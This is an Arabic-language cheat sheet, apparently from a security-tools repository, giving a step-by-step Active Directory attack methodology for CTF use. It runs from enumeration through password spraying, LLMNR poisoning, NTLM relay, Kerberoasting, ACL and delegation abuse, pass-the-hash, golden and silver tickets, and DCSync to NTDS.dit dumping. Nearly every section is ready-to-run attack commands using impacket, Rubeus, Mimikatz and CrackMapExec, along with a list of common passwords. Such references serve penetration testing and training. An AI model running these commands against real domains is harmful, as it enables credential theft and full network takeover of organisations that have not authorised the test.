<a id="-active-directory-attack-methodology"></a>
# 🏢 منهجية اختبار الهجمات على Active Directory

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Step-by-Step Guide from User to Domain Admin
```

> يعرض الرسم النصي عنوان منهجية Active Directory بالإنجليزية؛ AD خدمة دليل لإدارة هويات النطاق وأجهزته وصلاحياته. تعرض الصفحة أمثلة لمسارات انتقال من مستخدم إلى صلاحيات أعلى.

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

<a id="-attack-path-overview"></a>
## 🗺️ نظرة عامة على مسار الهجوم

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     AD ATTACK METHODOLOGY                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   PHASE 1: Enumeration     PHASE 2: Initial Access    PHASE 3: PrivEsc │
│   ├── Network Scan         ├── Password Spray         ├── Kerberoast   │
│   ├── LDAP Enum            ├── LLMNR Poison           ├── AS-REP       │
│   ├── User Enum            └── NTLM Relay             └── ACL Abuse    │
│   └── BloodHound                                                        │
│                                                                         │
│   PHASE 4: Lateral Move    PHASE 5: Persistence      PHASE 6: Domain   │
│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key          └── Full Pwn!     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

> **شرح المخطط:** تشمل المرحلة الأولى استطلاع الشبكة وLDAP والمستخدمين وجمع بيانات BloodHound؛ والثانية رش كلمات المرور وتسميم LLMNR وترحيل NTLM؛ والثالثة Kerberoasting وAS-REP وإساءة استخدام ACL. تتناول الرابعة الانتقال الجانبي عبر التجزئات وWinRM وPSExec وWMI؛ والخامسة الحفاظ على الوصول بالتذاكر الذهبية والفضية أو Skeleton Key؛ والسادسة السيطرة على النطاق عبر DCSync وNTDS.dit. المخطط نظرة تنظيمية ولا يفرض ترتيبًا إلزاميًا لكل بيئة.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

1. [المرحلة 1: جمع المعلومات (Enumeration)](#-phase-1-enumeration)
2. [المرحلة 2: الوصول الأولي](#-phase-2-initial-access)
3. [المرحلة 3: تصعيد الصلاحيات](#-phase-3-privilege-escalation)
4. [المرحلة 4: الانتقال الجانبي بين الأجهزة](#-phase-4-lateral-movement)
5. [المرحلة 5: الحفاظ على الوصول (Persistence)](#-phase-5-persistence)
6. [المرحلة 6: السيطرة على النطاق](#-phase-6-domain-dominance)
7. [مرجع سريع للأوامر](#-quick-command-reference)

---

<a id="-phase-1-enumeration"></a>
## 🔍 المرحلة 1: جمع المعلومات (Enumeration)

<a id="11-network-discovery"></a>
### 1.1 اكتشاف الشبكة

```bash
# العثور على وحدات التحكم بالنطاق
nmap -p 53,88,389,636,445 10.10.10.0/24

# تحديد خدمات AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**المنافذ الرئيسية:**
| المنفذ | الخدمة | الغرض |
|------|---------|---------|
| 53 | DNS | تحويل أسماء النطاقات إلى عناوين |
| 88 | Kerberos | المصادقة |
| 389 | LDAP | خدمة الدليل |
| 445 | SMB | مشاركات الملفات |
| 636 | LDAPS | اتصال LDAP آمن |
| 5985 | WinRM | الإدارة عن بُعد |

<a id="12-anonymous-enumeration-no-creds"></a>
### 1.2 جمع المعلومات دون مصادقة (دون بيانات اعتماد)

```bash
# جلسة RPC دون بيانات اعتماد
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# ارتباط LDAP مجهول الهوية
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# تعداد المستخدمين باستخدام Kerbrute دون بيانات اعتماد
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

<a id="13-with-valid-credentials"></a>
### 1.3 باستخدام بيانات اعتماد صالحة

```bash
# الحصول على معلومات النطاق
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# جمع معلومات LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

<a id="14-powerview-enumeration"></a>
### 1.4 جمع المعلومات باستخدام PowerView

```powershell
# استيراد PowerView
Import-Module .\PowerView.ps1

# معلومات النطاق
Get-Domain
Get-DomainController

# العثور على أهداف مهمة للاختبار
Get-DomainUser -SPN                    # قابل لاختبار Kerberoasting
Get-DomainUser -PreauthNotRequired      # قابل لاختبار AS-REP
Get-DomainComputer -Unconstrained       # التفويض

# العثور على جلسات مسؤولي النطاق (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

<a id="15-bloodhound-collection"></a>
### 1.5 جمع البيانات لـ BloodHound

```bash
# من Linux باستخدام bloodhound-python
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# من Windows باستخدام SharpHound
.\SharpHound.exe -c All
```

**استعلامات BloodHound:**
```cypher
# أقصر مسار إلى مسؤول النطاق
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# المستخدمون القابلون لاختبار Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# مستخدمون لديهم صلاحيات DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

> **تصحيح لدلالة الاستعلام:** البحث عن أي علاقة من GetChanges أو GetChangesAll لا يثبت وحده صلاحية DCSync؛ تمثل علاقة DCSync في BloodHound اجتماع الحقّين. لذا قد يعيد استعلام المصدر مرشحين أوسع من الحسابات القادرة فعلًا على المزامنة، كما قد تختلف صيغة الاستعلام باختلاف إصدار المخطط. احتُفظ بالاستعلام الأصلي. [توثيق علاقة DCSync الرسمي](https://bloodhound.specterops.io/resources/edges/dc-sync).

---

<a id="-phase-2-initial-access"></a>
## 🔑 المرحلة 2: الوصول الأولي

<a id="21-password-spraying"></a>
### 2.1 رش كلمات المرور (Password Spraying)

```bash
# رش كلمات المرور باستخدام CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# رش كلمات المرور باستخدام Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**كلمات مرور شائعة:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

> تعكس صيغ المصدر أمثلة تركيب كلمة مرور من موسم وسنة أو اسم شركة وأرقام، ثم أمثلة كلمات عامة؛ أُبقيت الأنماط والقيم الإنجليزية حرفيًا لأنها مدخلات اختبار وليست عبارات للترجمة.

<a id="22-llmnrnbt-ns-poisoning"></a>
### 2.2 تسميم استجابات LLMNR/NBT-NS

```bash
# الطرفية 1: بدء Responder
sudo responder -I eth0 -wPv

# انتظار بيانات المصادقة...
# التُقطت استجابة مصادقة NTLMv2!

# الطرفية 2: اختبار كلمة المرور من الاستجابة
hashcat -m 5600 hash.txt rockyou.txt
```

<a id="23-ntlm-relay"></a>
### 2.3 ترحيل مصادقة NTLM ‏(NTLM Relay)

```bash
# العثور على أهداف لا تُلزم بتوقيع SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (خدمة SMB معطّلة)
sudo responder -I eth0

# هجوم ترحيل المصادقة
impacket-ntlmrelayx -tf relay.txt -smb2support
```

> **ملاحظة على اكتمال الإعداد:** تعليق «SMB معطّلة» يصف حالة إعداد مطلوبة، لكن أمر تشغيل Responder المعروض لا يضبطها بنفسه؛ تُدار خدماته عبر Responder.conf. بقيت الخطوات الأصلية كما هي. [توثيق Responder الرسمي](https://github.com/lgandx/Responder).

<a id="24-as-rep-roasting-no-password-required"></a>
### 2.4 استخراج AS-REP لاختبار كلمة المرور (لا تُشترط كلمة مرور!)

```bash
# العثور على مستخدمين تنطبق عليهم شروط الاختبار
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# أو باستخدام بيانات اعتماد
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# اختبار استعادة كلمة المرور
hashcat -m 18200 asrep.txt rockyou.txt
```

> **توضيح للشرط:** عبارة «لا تُشترط كلمة مرور» في AS-REP لا تعني انطباقها على كل حساب؛ المثال يخص الحسابات التي لا تتطلب مصادقة Kerberos المسبقة، وهي حالة إعداد مميّزة مثل DONT_REQ_PREAUTH. [توثيق Microsoft لخصائص الحساب](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties).

---

<a id="-phase-3-privilege-escalation"></a>
## ⬆️ المرحلة 3: تصعيد الصلاحيات

<a id="31-kerberoasting"></a>
### 3.1 Kerberoasting (اختبار كلمات مرور حسابات الخدمات)

```bash
# من Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# من Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# اختبار استعادة كلمة المرور
hashcat -m 13100 kerberoast.txt rockyou.txt
```

> **ملاحظة على الملفات:** يكتب مثال Rubeus إلى hashes.txt بينما يقرأ أمر Hashcat اللاحق kerberoast.txt؛ ولا تتضمن الخطوات المعروضة ربط الملفين أو حفظ ناتج GetUserSPNs فيهما. أُبقيت الأسماء كما في المصدر، فالأمثلة ليست سلسلة ملفات مكتملة تلقائيًا.

<a id="32-acl-abuse"></a>
### 3.2 إساءة استخدام قوائم التحكم في الوصول (ACL)

**صلاحية GenericAll على مستخدم:**
```powershell
# تغيير كلمة المرور
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**صلاحية GenericAll على مجموعة:**
```powershell
# إضافة حسابك إلى المجموعة
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# تعيين SPN لاختبار Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# منح حسابك صلاحيات DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

<a id="33-delegation-attacks"></a>
### 3.3 هجمات التفويض (Delegation)

**التفويض غير المقيّد (Unconstrained Delegation):**
```powershell
# العثور على الأهداف
Get-DomainComputer -Unconstrained

# مراقبة تذاكر TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# تحفيز الطلب باستخدام PrinterBug
SpoolSample.exe DC01 YOURHOST
```

**التفويض المقيّد (Constrained Delegation):**
```bash
# طلب تذكرة
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# استخدام التذكرة
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**التفويض المقيّد القائم على المورد (RBCD):**
```bash
# إنشاء حساب جهاز
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# ضبط RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# الحصول على تذكرة
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

> **متطلبات RBCD:** لا يكفي امتلاك حساب مستخدم عادي وحده؛ تتطلب خطوة ضبط التفويض القدرة على تعديل الخاصية msDS-AllowedToActOnBehalfOfOtherIdentity على كائن الجهاز الهدف، ويلزم حساب مسيطر عليه يملك SPN. كما يعتمد إنشاء حساب جهاز جديد على أذونات النطاق وإعداداته. [توثيق AddAllowedToAct](https://bloodhound.specterops.io/resources/edges/add-allowed-to-act)، [توثيق AllowedToAct](https://bloodhound.specterops.io/resources/edges/allowed-to-act).

---

<a id="-phase-4-lateral-movement"></a>
## ➡️ المرحلة 4: الانتقال الجانبي بين الأجهزة

<a id="41-pass-the-hash"></a>
### 4.1 استخدام التجزئة للمصادقة (Pass-the-Hash)

```bash
# استخدام PSExec مع التجزئة
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

<a id="42-pass-the-ticket"></a>
### 4.2 استخدام تذكرة موجودة للمصادقة (Pass-the-Ticket)

```bash
# تصدير التذكرة
.\Rubeus.exe dump

# استخدام التذكرة في Linux
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# استخدام التذكرة في Windows
.\Rubeus.exe ptt /ticket:base64ticket
```

<a id="43-winrm"></a>
### 4.3 WinRM

```bash
# استخدام Evil-WinRM مع كلمة مرور
evil-winrm -i 10.10.10.10 -u admin -p password

# باستخدام التجزئة
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

<a id="44-overpass-the-hash"></a>
### 4.4 الحصول على تذكرة باستخدام التجزئة (Overpass-the-Hash)

```bash
# الحصول على TGT باستخدام التجزئة
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# استخدام Kerberos بعد ذلك
dir \\server\share
```

---

<a id="-phase-5-persistence"></a>
## 🔒 المرحلة 5: الحفاظ على الوصول (Persistence)

<a id="51-golden-ticket"></a>
### 5.1 التذكرة الذهبية (Golden Ticket)

```bash
# Need: krbtgt NTLM hash + Domain SID

# إنشاء التذكرة
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# الاستخدام
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

<a id="52-silver-ticket"></a>
### 5.2 التذكرة الفضية (Silver Ticket)

```bash
# إنشاء تذكرة خدمة
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

<a id="53-dcsync-backdoor"></a>
### 5.3 إنشاء وصول مستمر عبر صلاحيات DCSync

```powershell
# إضافة صلاحيات DCSync إلى مستخدم
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

<a id="-phase-6-domain-dominance"></a>
## 👑 المرحلة 6: السيطرة على النطاق

<a id="61-dcsync"></a>
### 6.1 DCSync

```bash
# استخراج جميع التجزئات
impacket-secretsdump domain.local/admin:password@10.10.10.10

# باستخدام التجزئة
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# مستخدم محدد
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

<a id="62-ntdsdit-extraction"></a>
### 6.2 استخراج NTDS.dit

```bash
# إنشاء نسخة ظل
vssadmin create shadow /for=C:

# نسخ NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# الاستخراج دون الاتصال بالخادم
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

<a id="63-crackmapexec-dump"></a>
### 6.3 استخراج البيانات باستخدام CrackMapExec

```bash
# استخراج بيانات NTDS عبر DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

<a id="-quick-command-reference"></a>
## 📊 مرجع سريع للأوامر

<a id="enumeration-one-liners"></a>
### أوامر جمع معلومات من سطر واحد

```bash
# العثور على وحدات التحكم بالنطاق (DCs)
nmap -p 88,389 --open 10.10.10.0/24

# تعداد المستخدمين دون بيانات اعتماد
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# العثور على حسابات قابلة لاختبار AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# اختبار Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

<a id="attack-cheatsheet"></a>
### مرجع سريع للهجمات

| الهجوم | الأمر |
|--------|---------|
| رش كلمات المرور (Password Spray) | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

<a id="hash-cracking"></a>
### اختبار استعادة كلمات المرور من التجزئات

| نوع التجزئة | وضع Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

> **توضيح لأنواع التجزئة:** يخص mode 13100 استجابات Kerberos TGS-REP ذات etype 23، وmode 18200 استجابات AS-REP ذات etype 23؛ لا يصح تعميم الرقمين على كل أنواع تشفير Kerberos. كما يخص mode 5600 بيانات تحدي واستجابة NetNTLMv2، ويختلف عن تجزئة NTLM المحلية ذات mode 1000. [جدول Hashcat الرسمي](https://hashcat.net/wiki/doku.php?id=example_hashes).

---

<a id="-ctf-tips"></a>
## 🎯 نصائح لتحديات CTF

1. **ابدأ دائمًا بجمع المعلومات** - لا تبدأ الهجوم دون فهم الهدف
2. **تحقق من AS-REP** - إمكانية الحصول على استجابات قابلة للاختبار دون بيانات اعتماد!
3. **استخدم BloodHound** - حدّد مسارات الهجوم
4. **افحص قوائم ACL** - قد تتضمن إعدادات غير صحيحة
5. **ابحث عن التفويض** - فرص أولية محتملة
6. **نفّذ رش كلمات المرور بحذر** - قد تُقفل الحسابات!
7. **احتفظ بجميع بيانات الاعتماد** - قد تحتاج إليها لاحقًا

---

<a id="-related-cheatsheets"></a>
## 📚 مراجع سريعة ذات صلة

- [BloodHound](../../BloodHound/translations/README.ar.md)
- [Impacket](../../Impacket/translations/README.ar.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Rubeus](../../Rubeus/README.md)
- [PowerView](../../PowerView/README.md)
- [Responder](../../Responder/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)

---

<p align="center">
  <b>🏢 من صلاحيات المستخدم إلى مسؤول النطاق!</b><br>
  <i>اتّباع المنهجية لفهم مسارات السيطرة على النطاق</i>
</p>
